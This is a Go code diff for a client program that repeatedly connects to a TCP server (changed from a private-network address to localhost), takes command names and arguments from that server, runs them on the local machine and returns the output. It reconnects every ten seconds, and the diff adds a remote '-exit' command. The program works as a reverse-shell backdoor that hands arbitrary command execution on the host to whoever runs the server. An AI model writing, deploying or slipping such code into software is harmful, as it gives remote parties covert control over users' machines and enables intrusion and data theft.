@@ -19,14 +19,17 @@ const version = "1.0"
 
 func main() {
 	for {
-		ToServer()
+		run := ToServer()
+		if run == false {
+			return
+		}
 		time.Sleep(10 * time.Second)
 	}
 }
-func ToServer() {
-	conn, err := net.Dial("tcp", "192.168.168.101:10000")
+func ToServer() bool {
+	conn, err := net.Dial("tcp", "127.0.0.1:10000")
 	if err != nil {
-		return
+		return true
 	}
 	defer conn.Close()
 	r := bufio.NewReader(conn)
@@ -44,12 +47,14 @@ func ToServer() {
 			switch receive.CommandName {
 			case "-v":
 				conn.Write([]byte("client " + version + "\n"))
+			case "-exit":
+				return false
 			default:
 				execCommand(receive.CommandName, receive.Params, conn)
 			}
-
 		}
 	}
+	return true
 }
 func execCommand(commandName string, params []string, conn net.Conn) bool {
 	cmd := exec.Command(commandName, params...)
